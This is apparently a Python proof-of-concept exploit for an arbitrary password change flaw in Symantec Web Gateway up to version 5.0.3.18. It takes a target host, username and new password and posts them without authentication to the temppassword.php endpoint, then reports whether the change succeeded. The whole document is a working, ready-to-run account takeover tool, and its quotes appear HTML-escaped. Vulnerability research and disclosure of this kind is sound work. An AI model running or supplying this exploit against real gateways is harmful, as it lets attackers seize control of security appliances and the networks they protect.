 
import urllib
import urllib2
import re
import sys
 
print "[*] ###########################################################"
print "[*] Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change"
print "[*] @_Kc57"
print "[*] ###########################################################\n"
 
 
if (len(sys.argv) != 4):
    print "Usage: poc.py <RHOST> <username> <newpassword>"
    exit(0)
 
ip = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
 
url = "https://%s/spywall/temppassword.php" % (ip)
 
opts = {
    &#039;target&#039;:&#039;executive_summary.php&#039;,
    &#039;USERNAME&#039;:username,
    &#039;password&#039;:password,
    &#039;password2&#039;:password,
    &#039;Save&#039;:&#039;Save&#039;
}
 
print "[*] Sending request to server..."
 
data = urllib.urlencode(opts)
request = urllib2.Request(url, data)
response = urllib2.urlopen(request)
 
match = re.search(&#039;Your new password has been saved&#039;, response.read())
 
if(match):
    print "[*] Password for %s changed to %s" %(username,password)
else:
    print "[*] Password change failed!"



